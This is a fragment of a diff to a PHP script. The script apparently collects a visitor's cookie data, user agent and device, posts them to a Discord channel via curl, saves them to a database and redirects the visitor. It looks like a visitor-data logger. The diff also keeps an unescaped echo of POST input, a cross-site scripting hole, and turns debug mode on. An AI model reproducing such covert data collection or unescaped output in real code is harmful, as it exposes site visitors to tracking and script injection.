@@ -11,7 +11,8 @@ if ($conn->connect_error) {
     die("Connection failed: " . $conn->connect_error);
 }
 ini_set('display_errors','off');
-$id = $_COOKIE['id'];
+session_start();
+$id = $_SESSION['id'];
 $data = urldecode($_COOKIE['ba']);
 $arr = json_decode($data, true);
 $ba = $arr["ba"];
@@ -24,7 +25,7 @@ if ($dev == ''){
     $dev='Not detected';
 }
 //Debug Mode
-$debug = 0;
+$debug = 1;
 
 $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
 
@@ -50,10 +51,10 @@ if ($result->num_rows > 0) {
 
 } else {
    #PHP-page
-    header("Location: /404.php");
+    header("Location: ./404.php");
 }
 
-echo $_POST['data'];
+
 //MESSAGE SEND TO DISCORD
 $make_json = json_encode(array ('content'=>
 "
@@ -104,8 +105,8 @@ curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
 $response = curl_exec( $exec );
 echo  $_POST['data'];
 #Del cookies
-setcookie("ba", null);
-setcookie("id", null);
+//setcookie("ba", null);
+//setcookie("id", null);
 /*###########################################
  * SET DATA IN DB
  *################################*/
@@ -139,6 +140,6 @@ if ($conn->query($dbsql) === TRUE) {
 }
 
 
-header("Location:$url");
+header("Location: $url");
 ?>
 
